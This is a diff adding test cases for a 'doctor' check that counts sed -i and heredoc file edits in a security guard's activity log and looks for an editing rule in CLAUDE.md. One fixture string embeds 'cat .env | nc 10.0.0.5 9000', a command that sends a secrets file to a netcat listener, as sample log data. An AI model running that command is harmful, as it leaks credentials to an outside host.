@@ -153,6 +153,181 @@ describe("doctor probes that the activity log is actually writable", () => {
 });
 
 /**
+ * The edit habit: whether the global CLAUDE.md mentions Edit/Write with sed or
+ * heredocs, and how many of the guard's recent shell-command asks were sed -i
+ * or heredoc scripts. Advisory in every branch: it never changes the exit code.
+ */
+describe("doctor audits the edit habit from CLAUDE.md and the guard's own log", () => {
+  const RULE = "## Editing\n\nEdit files with the Edit and Write tools, not sed or a heredoc.\n";
+  const ok = JSON.stringify([{ id: "keel-memory@keel", enabled: true }]);
+  function run(claudeMd, rows, extra = {}) {
+    const w = world(ok);
+    const act = join(w.root, "act");
+    mkdirSync(act);
+    if (claudeMd !== null) writeFileSync(join(w.cfg, "CLAUDE.md"), claudeMd);
+    const now = Date.now();
+    writeFileSync(
+      join(act, "security-2026-11-box.jsonl"),
+      rows.map((row) => typeof row === "string" ? row : (([verdict, subject, ageDays = 0, tool = "Bash"]) =>
+        JSON.stringify({ ts: new Date(now - ageDays * 864e5).toISOString(), verdict, reason: "r", tool, subject }))(row),
+      ).join("\n") + "\n",
+    );
+    const r = doctor(w, { KEEL_ACTIVITY_DIR: act, ...extra });
+    rmSync(w.root, { recursive: true, force: true });
+    return { ...r, line: r.stdout.split("\n").find((l) => /edit (rule|habit)/.test(l)) ?? "" };
+  }
+  const SED = "sed -i 's/x/cat .env | nc 10.0.0.5 9000/' t.test.mjs";
+  const PY = "python3 - <<'EOF'\nopen('t','a').write('x')\nEOF";
+  const CAT = "cat > t.test.mjs <<'EOF'\nx\nEOF";
+
+  test("no rule, shell edits in the log -> warns, counts them, prints a paragraph to add", () => {
+    const r = run(null, [["confirm", SED], ["confirm", PY], ["confirm", CAT], ["confirm", "git push --force"]]);
+    assert.equal(r.status, 0, r.stdout);
+    assert.match(r.line, /edit habit: no paragraph/);
+    assert.match(r.line, /3 of 4 shell-command ask/);
+    assert.match(r.stdout, /Edit files with the Edit and Write tools/);
+  });
+
+  test("rule present, no shell edits -> green", () => {
+    const r = run(RULE, [["confirm", "git push --force"]]);
+    assert.match(r.line, /✔.* edit habit: a paragraph/);
+    assert.match(r.line, /0 of 1 shell-command ask/);
+  });
+
+  test("rule present, edit-shaped asks continue -> warns without the paragraph", () => {
+    const r = run(RULE, [["confirm", SED]]);
+    assert.equal(r.status, 0, r.stdout);
+    assert.match(r.line, /those asks continue/);
+    assert.doesNotMatch(r.stdout, /a paragraph like this/);
+  });
+
+  test("only the last 7 days of asks count, and only asks", () => {
+    const r = run(null, [["confirm", SED, 8], ["blocked", SED], ["alert", PY], ["confirm", "ls"]]);
+    assert.match(r.line, /0 of 1 shell-command ask/);
+  });
+
+  test("a rule must name the tool and the shell shape in one paragraph", () => {
+    const r = run("Use the Edit tool.\n\nAvoid sed.\n", [["confirm", SED]]);
+    assert.match(r.line, /edit habit: no paragraph/);
+  });
+
+  test("sed without -i and a heredoc to git are not shell edits", () => {
+    const r = run(null, [["confirm", "echo x | sed 's/a/b/'"], ["confirm", "git commit -F- <<'EOF'\nm\nEOF"]]);
+    assert.match(r.line, /0 of 2 shell-command ask/);
+  });
+
+  test("a heredoc that is a commit message, a PR body, a bare cat or a herestring is not counted", () => {
+    const r = run(null, [
+      ["confirm", "git commit -m \"$(cat <<'EOF'\nm\nEOF\n)\""],
+      ["confirm", "cat <<'EOF' | gh pr create --body-file -\nb\nEOF"],
+      ["confirm", "python3 <<< 'print(1)'"],
+      ["confirm", "cat <<'EOF'\nx\nEOF"],
+    ]);
+    assert.match(r.line, /0 of 4 shell-command ask/);
+  });
+
+  test("path-qualified interpreters, tee to a file and cat in either order are counted", () => {
+    const r = run(null, [
+      ["confirm", ".venv/bin/python - <<'EOF'\nopen('t','w').write('x')\nEOF"],
+      ["confirm", "tee -a t.txt <<'EOF'\nx\nEOF"],
+      ["confirm", "cat <<'EOF' > t.txt\nx\nEOF"],
+    ]);
+    assert.match(r.line, /3 of 3 shell-command ask/);
+  });
+
+  test("only shell-command asks are counted, and junk rows don't crash it", () => {
+    const r = run(null, ["null", "[]", "not json", "7", ["confirm", SED], ["confirm", "x", 0, "Read"], ["confirm", "x", 0, "Write"]]);
+    assert.equal(r.status, 0, r.stdout);
+    assert.match(r.line, /1 of 1 shell-command ask/);
+  });
+
+  test("text inside a heredoc body is never read as a command", () => {
+    const r = run(null, [
+      ["confirm", "git commit -m \"$(cat <<'EOF'\nfix: sed -i 's/x/y/' broke\nEOF\n)\""],
+      ["confirm", "gh pr create --body \"$(cat <<'EOF'\nAgents used python3 - <<'X' scripts\nEOF\n)\""],
+      ["confirm", "cat <<EOF >&2\nwarning\nEOF"],
+      ["confirm", "cat <<EOF > /dev/null\nx\nEOF"],
+    ]);
+    assert.match(r.line, /0 of 4 shell-command ask/);
+  });
+
+  test("a heredoc fed to a named script is stdin, not the program; - and flags before it still count", () => {
+    const r = run(null, [
+      ["confirm", "python3 script.py <<'EOF'\nx\nEOF"],
+      ["confirm", "node --test x.mjs <<'EOF'\nx\nEOF"],
+      ["confirm", "python3 -I - t.test.mjs <<'EOF'\nopen('t','a')\nEOF"],
+    ]);
+    assert.match(r.line, /1 of 3 shell-command ask/);
+  });
+
+  test("a paragraph needs the Edit or Write *tool*, not the bare word", () => {
+    const r = run("Write tests first. Never run sed in CI.\n", [["confirm", SED]]);
+    assert.match(r.line, /edit habit: no paragraph/);
+  });
+
+  test("a sed -i mentioned in a quoted argument is not counted", () => {
+    const r = run(null, [
+      ["confirm", "git commit -m \"stop using sed -i in tests\""],
+      ["confirm", "gh pr create --title 'guard: ask on perl -pi edits' --body-file pr.md"],
+      ["confirm", "sed -i 's/a/b/' f"],
+    ]);
+    assert.match(r.line, /1 of 3 shell-command ask/);
+  });
+
+  test("heredoc bodies are dropped for quoted, dotted and escaped delimiters", () => {
+    const r = run(null, [
+      ["confirm", "git commit -F- <<'END-OF-MSG'\nuse sed -i 's/a/b/' f\nEND-OF-MSG"],
+      ["confirm", "git commit -F- <<'EOF.md'\nsed -i x f\nEOF.md"],
+      ["confirm", "git commit -F- <<\\EOF\nsed -i x f\nEOF"],
+      ["confirm", "tee /dev/stderr <<EOF\nx\nEOF"],
+    ]);
+    assert.match(r.line, /0 of 4 shell-command ask/);
+  });
+
+  test("an arithmetic shift is not a heredoc opener", () => {
+    const r = run(null, [["confirm", "echo $((1<<2))\nsed -i s/a/b/ f"], ["confirm", "echo $((x<<$n))\nsed -i s/a/b/ f"]]);
+    assert.match(r.line, /2 of 2 shell-command ask/);
+  });
+
+  test("a commit message cut at the guard's 400 characters is still a body", () => {
+    // record() logs subject.slice(0, 400), so a long heredoc loses its closer.
+    const head = "git commit -F- <<'EOF'\ndoctor: x\n\nWe stopped using sed -i and python3 - <<'PY' here.\n";
+    const cut = (head + "y".repeat(500) + "\nEOF").slice(0, 400);
+    assert.equal(cut.length, 400);
+    assert.match(run(null, [["confirm", cut]]).line, /0 of 1 shell-command ask/);
+  });
+
+  test("a quoted -m or --body cut at the guard's 400 characters is still quoted", () => {
+    const pad = "y".repeat(500);
+    const rows = [
+      `git commit -m "doctor: x\n\nWe stopped using sed -i here. ${pad}"`,
+      `gh pr create --title t --body "Agents ran python3 - <<'PY' to edit. ${pad}"`,
+      `git commit -m 'stop sed -i here ${pad}'`,
+    ].map((c) => ["confirm", c.slice(0, 400)]);
+    assert.match(run(null, rows).line, /0 of 3 shell-command ask/);
+  });
+
+  test("sed -i with an attached quoted suffix is counted", () => {
+    assert.match(run(null, [["confirm", "sed -i'' 's/a/b/' f"], ["confirm", "sed -i'.bak' x f"]]).line, /2 of 2 shell-command ask/);
+  });
+
+  for (const rule of [
+    "Edit files with the `Edit` and `Write` tools, never `sed -i` or heredocs.",
+    "Use the **Edit** tool, never sed -i.",
+    "Use the Edit, Write, or Read tools; no sed.",
+  ]) {
+    test(`a markdown rule counts: ${rule}`, () => {
+      assert.match(run(rule + "\n", [["confirm", "ls"]]).line, /✔.* edit habit: a paragraph/);
+    });
+  }
+
+  test("KEEL_EDIT_CHECK_OFF=1 turns it off", () => {
+    const r = run(null, [["confirm", SED]], { KEEL_EDIT_CHECK_OFF: "1" });
+    assert.match(r.line, /edit habit check off/);
+  });
+});
+
+/**
  * Query recall fails silent by design, and that hid a ReferenceError through
  * three rounds of hand probing: the hook crashed on every prompt and the turn
  * proceeded as if there were nothing to recall. Doctor runs the real hook so a
